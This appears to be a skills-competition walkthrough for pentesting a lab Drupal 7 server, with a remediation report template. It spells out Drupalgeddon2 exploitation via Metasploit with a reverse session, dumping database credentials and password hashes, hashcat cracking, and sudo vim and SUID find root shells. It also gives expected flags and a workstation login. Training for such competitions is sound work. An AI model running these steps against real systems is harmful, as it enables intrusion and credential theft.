# 10 — Day 1 (MA1) — CMS Pentest Walkthrough

**Target time:** ~3 hours of focused work + 1–2 hours of documentation = full Day 1.
**Login (workstation):** `competitor1a / Boracay@14!`
**VMs:** CMS target `192.168.2.1` + Kali `192.168.2.2 (kali/kali)`
**Deliverable:** ONE document on the desktop, named with your country code, containing answers to **4 task tables** with screenshots + executive summary + top-3 risks.

> Source of truth: `testpacakge_pdf/WSA2025_TP54_MA1_actual_en_final (1).pdf`. Re-read it on competition day before starting — wording or specific questions may shift.

---

## What MA1 actually asks (4 tasks)

| Task | What | Answers required |
|---|---|---|
| **1. Information Gathering** | Scan the target, identify services, find a hidden secret message in one of the services | Q1 services list (+ screenshot), Q2 secret message (+ screenshot) |
| **2. CMS Vulnerability Assessment** | Identify CMS version + pentest the CMS to uncover sensitive info | Q1 version (+ screenshot), Q2 sensitive info via pentest (+ screenshot) |
| **3. System Security Weaknesses** | Find the weak user account, crack pwd, find sensitive info in their home, escalate to root | Q1 username (+ screenshot), Q2 password (+ screenshot), Q3 home-dir secret (+ screenshot), Q4 root info (+ screenshot) |
| **4. Analysis & Report** | Executive summary (≤150 words) + top-3 security risks table | Filled-in template |

---

## Phase 0 — Setup (5 min)

On Kali (`kali/kali`):
```bash
# Set the target as a variable
export TGT=192.168.2.1
mkdir -p ~/ma1 && cd ~/ma1
```

Open a screenshot tool (Greenshot, or Kali's built-in `Screenshots` app). **Capture a screenshot of every command's output** — you need them for the report.

---

## Task 1 — Information Gathering

### Q1 — Identify services running on the target

```bash
# Quick top-1000 ports
nmap -sC -sV -T4 -oN nmap_quick.txt $TGT
```

**Expected output for our practice target:**
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.x (Ubuntu)
80/tcp   open  http     Apache httpd 2.4.x
| http-server-header: Apache/2.4.x (Ubuntu)
| http-generator: Drupal 7
```

**Answer for Q1:** "The target runs **2 services**: SSH on port 22 (OpenSSH) and HTTP on port 80 (Apache hosting Drupal 7 CMS)."

📸 **Screenshot the nmap output.**

For thoroughness (full port range — slower):
```bash
nmap -p- --min-rate 5000 -oN nmap_full.txt $TGT
```

### Q2 — Connect to a service, find a hidden secret message

This is the "low-hanging fruit" task. Try each service for hidden info:

#### 2.1 — Check SSH banner
```bash
nc -nv $TGT 22
# (Press Ctrl+C after 5 sec)
```
Read the banner — sometimes the secret message is there. If not, move on.

#### 2.2 — Check HTTP for hidden files / banner
```bash
# Header dump
curl -I http://$TGT/

# Check robots.txt
curl http://$TGT/robots.txt

# Check standard hidden paths
curl http://$TGT/.htaccess
curl http://$TGT/CHANGELOG.txt
curl http://$TGT/README.txt

# Look at HTML source for HTML comments
curl -s http://$TGT/ | grep -i "secret\|flag\|message\|todo\|hidden"
```

For Drupal specifically, `CHANGELOG.txt` and `README.txt` are often readable and contain the version.

**Most likely place for the "secret message":** view the HTML source of the home page — there's typically an HTML comment like `<!-- secret: flag{...} -->` planted by the chief.

```bash
curl -s http://$TGT/ -o home.html
less home.html
# search for: <!-- 
```

If nothing in HTTP, try directory enumeration:
```bash
gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x txt,html,php -o gobuster.txt
```

📸 **Screenshot whichever method finds the secret.**

**Answer for Q2:** Once found, paste the message text in the answer cell. Example: *"Secret message found in HTML comment of /index.php: 'flag{discovered_in_html_source}'"*

---

## Task 2 — CMS Vulnerability Assessment

### Q1 — Identify the CMS version

#### 2.1 — Use whatweb
```bash
whatweb http://$TGT
```
Output will show: `Drupal[7.57]` or similar — that's the version.

#### 2.2 — Confirm via CHANGELOG
```bash
curl -s http://$TGT/CHANGELOG.txt | head -5
```
First line usually says: `Drupal 7.57, 2018-02-21`.

#### 2.3 — Drupal-specific scanner
```bash
droopescan scan drupal -u http://$TGT
```
Reports version, enabled modules, and known users.

**Answer Q1:** *"The target runs **Drupal 7.57**, confirmed via whatweb and the CHANGELOG.txt file."*

📸 **Screenshot whatweb output + CHANGELOG.txt header.**

### Q2 — Pentest the CMS, uncover sensitive info

#### 2.4 — Search for known exploits
```bash
searchsploit drupal 7
```
Look for **"Drupal 7.x Module Services - Remote Code Execution"** and **"Drupal 7.0 < 7.31 - SQL Injection"** and **"Drupal < 7.58 - 'Drupalgeddon2' RCE"** (CVE-2018-7600).

#### 2.5 — Exploit Drupalgeddon 2 via Metasploit
```bash
msfconsole -q
```
Inside msfconsole:
```
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.2.1
set LHOST 192.168.2.2
set TARGETURI /
run
```
You should land in a Meterpreter shell as **`www-data`**.

```
meterpreter > getuid
Server username: www-data
```

#### 2.6 — Extract sensitive information
Once you have the shell:
```bash
# Drop to a regular shell
shell

# Drupal stores DB creds in settings.php
cat /var/www/html/sites/default/settings.php | grep -A3 "databases"
# You'll see something like:
#   'database' => 'drupal',
#   'username' => 'drupal',
#   'password' => 'drupalpass',
```

```bash
# Dump Drupal users from the DB
mysql -u drupal -pdrupalpass drupal -e "SELECT uid,name,mail,pass FROM users;"
# Capture: admin and john user records, including their hashed passwords
```

📸 **Screenshot the settings.php DB credentials AND the users table dump.**

**Answer Q2:** *"Sensitive information uncovered via Drupalgeddon 2 (CVE-2018-7600) exploitation:*
- *Database credentials in `/var/www/html/sites/default/settings.php` (drupal/drupalpass)*
- *Drupal users table contains hashed passwords for admin and john accounts."*

---

## Task 3 — System Security Weaknesses

### Q1 — Identify the user account that exposes the system weakness

From the Drupal users table (Task 2.6), one user has a deliberately weak password. Looking at usernames:

```
uid | name  | mail              | pass
----+-------+-------------------+---------------------
1   | admin | admin@manila.local| $S$D... (long hash)
2   | john  | john@manila.local | $S$D... (long hash)
```

**The weakness candidate is `john`** — admin account is typically protected by procedure; a regular user with a weak password is the typical "exposes a weakness" pattern.

📸 **Screenshot the Drupal /admin/people page showing the user list, OR the users table dump highlighting john.**

**Answer Q1:** *"User account `john` (uid=2) — exposes the system weakness via a weak password that violates security policies."*

### Q2 — Crack john's password

#### 2.1 — Get the hash from the DB dump (Drupal 7 hash format starts with `$S$`)
```bash
# Save the hash to a file
echo '$S$D...rest_of_hash' > /tmp/john.hash
```

#### 2.2 — Crack with hashcat
Drupal 7 hash mode = `7900` in hashcat:
```bash
hashcat -m 7900 /tmp/john.hash /usr/share/wordlists/rockyou.txt
```
Wait ~5–30 sec. Hashcat will print:
```
$S$D...:password123
```

Or with John the Ripper:
```bash
john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/john.hash
```

📸 **Screenshot hashcat showing the cracked password.**

**Answer Q2:** *"john's password is `password123`, cracked using hashcat mode 7900 (Drupal 7) against rockyou.txt wordlist in under 1 minute."*

### Q3 — Sensitive info in john's home directory

Use the cracked password to SSH in:
```bash
ssh john@192.168.2.1
# password: password123
```

Then explore:
```bash
cd ~
ls -la
cat secret.txt
```

Output: `Hidden flag in john's home: flag{john_was_here_2025}`

Also check:
```bash
cat .bash_history     # commands john ran
ls -la ~/.ssh/         # any SSH keys?
find / -user john 2>/dev/null   # all files owned by john
```

📸 **Screenshot of `cat secret.txt` and any other interesting files.**

**Answer Q3:** *"In john's home directory `/home/john/secret.txt` — content: `flag{john_was_here_2025}`. File permissions 600 (owner-readable only)."*

### Q4 — Gain root access + sensitive info from /root/

#### 4.1 — Check privesc paths
Still as john on the SSH session:
```bash
sudo -l
# May print: (ALL) NOPASSWD: /usr/bin/vim

find / -perm -4000 -type f 2>/dev/null
# Look for non-standard SUID — find, vim, awk, python all suspicious
```

#### 4.2 — Privesc via sudo NOPASSWD vim (most common)
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
# You're now root.
whoami
# root
```

#### 4.2-alt — Privesc via SUID find
```bash
find . -exec /bin/sh -p \; -quit
# Spawns root shell because find is SUID.
whoami
# root
```

#### 4.3 — Read the root flag
```bash
cd /root
ls -la
cat proof.txt
# Output: Root flag: flag{root_compromise_complete_2025}
```

Also:
```bash
cat /etc/shadow | head -5     # all password hashes — proof of root
```

📸 **Screenshot the privesc command + `whoami` + `cat /root/proof.txt`.**

**Answer Q4:** *"Root access obtained via `sudo /usr/bin/vim -c ':!/bin/bash'` (john had NOPASSWD sudo on vim). Root directory `/root/proof.txt` contains: `flag{root_compromise_complete_2025}`. Also extracted `/etc/shadow` confirming full root privileges."*

---

## Task 4 — Analysis and Report

### Executive Summary (≤150 words)

Use this skeleton — adjust to your findings (the 150-word limit is strict):

```
Executive Summary

A vulnerability assessment and basic penetration test were performed
against a Linux server running Drupal 7.57 CMS. The assessment uncovered
multiple critical security weaknesses that allowed full system
compromise from initial reconnaissance to root access.

Three top risks were identified: (1) the CMS runs an unpatched version
vulnerable to Drupalgeddon 2 (CVE-2018-7600), allowing unauthenticated
remote code execution; (2) a regular user account (john) uses a
weak dictionary-based password that cracks in under a minute against
common wordlists; (3) the same user has unrestricted sudo access to
the vim editor, providing a trivial path to root privilege escalation.

Combined, these issues escalate from anonymous Internet exposure to
full root compromise within ~10 minutes. Immediate remediation is
required before this server should be considered safe for production.
```

Word count: ~145. Tweak to fit your actual findings.

### Table 1 — Security Risk and Mitigation Recommendation (top 3 only)

| Description | Severity (0–10) | Risk | Why is this a problem? | Mitigation Recommendation |
|---|---|---|---|---|
| **Drupal 7.57 vulnerable to Drupalgeddon 2 (CVE-2018-7600)** — unauthenticated RCE | **10** | **Critical** | Anyone on the network with no credentials can execute arbitrary code as the web user. Exploitation is fully automated via Metasploit. Leads to full server compromise. | Patch to Drupal ≥ 7.58 immediately. If patching impossible, apply the official mitigation patch. Move site behind WAF (ModSecurity + OWASP CRS) as compensating control. |
| **Weak user password (`john / password123`)** — present in common wordlists | **8** | **High** | A standard dictionary attack cracks the hash in under a minute. Once the credential is recovered, the attacker has SSH access to the system. | Enforce a domain password policy: minimum 12 characters, complexity (upper/lower/digit/symbol), 90-day rotation, deny-list of common passwords. Force john to reset. Implement account lockout after 5 failed SSH logins. |
| **Excessive sudo privileges (`john ALL=(ALL) NOPASSWD: /usr/bin/vim`)** — trivial privilege escalation | **9** | **Critical** | vim has a built-in shell escape (`:!sh`) that runs as the sudo target user (root). Any compromised john session = full root. | Remove the sudoers entry. Apply principle of least privilege: only specific scripts via sudo, never an editor. Audit all `/etc/sudoers.d/*` files. Consider sudo logging and `sudo --restricted` flags. |

### Save the deliverable

```
File name suggestion: PHL_Team1_MA1_Report.pdf
Save to: C:\Users\competitor1a\Desktop\
```

Per MA1 PDF: combine all answer documents into a single file labelled with country code on competitor's desktop. Print to PDF.

---

## Time check

| Phase | Target | Real |
|---|---|---|
| Setup + Task 1 (Info Gathering) | 0:30 | __ |
| Task 2 (CMS Vuln Assessment) | 0:30 | __ |
| Task 3 (Sys Weaknesses + Privesc) | 0:45 | __ |
| Task 4 (Report writing) | 1:00 | __ |
| Buffer / proofread | 0:15 | __ |
| **Total** | **3:00** | __ |

---

## What if the actual CMS isn't Drupal?

The chief may pick a different CMS (Joomla, WordPress, MediaWiki, etc.). The **methodology stays identical**:

| Step | What changes |
|---|---|
| Task 1 | nmap output identifies the CMS via banner / cookies / generator meta tag |
| Task 2 Q1 | Use whatweb / wpscan / joomscan / cmsmap depending on the CMS |
| Task 2 Q2 | `searchsploit <cms> <version>` to find the right exploit; replace `drupal_drupalgeddon2` with whatever Metasploit module fits |
| Task 3 | Same workflow: dump users → crack hash → SSH → privesc |
| Task 4 | Same report template, just swap the CVE numbers and CMS name |

Practice on Drupal 7 makes you fluent in the workflow. The actual CMS gets identified in Task 1 and the rest plugs in.

---

## Marks coverage (best estimate)

The marking scheme has 4 aspects in row A1 (D31 / D32 / D37 / D42) — Lyon-leftover row names. Based on Day 1 PDF tasks the K-values likely map as:

| Lyon row | What it likely scores in the actual MA1 |
|---|---|
| D31 (Meas, K=2.0) | Task 1 + Task 2 Q1 (services + version identified) |
| D32 (Judg, K=2.0 / max 3) | Executive summary quality |
| D37 (Judg, K=1.0 / max 3) | Top-3 risk table — risk #1 quality |
| D42 (Judg, K=1.0 / max 3) | Top-3 risk table — risks #2 and #3 quality |
| (likely additional rows) | Task 3 user/password/home/root + screenshots |

Total Crit A1 K-target: **6.0+** (may be more once chief releases the actual MA1-aligned marking scheme).

Next file: **`20_Day1_MA2_Firewall.md`** for Day 2 (MA2 hardening) work.
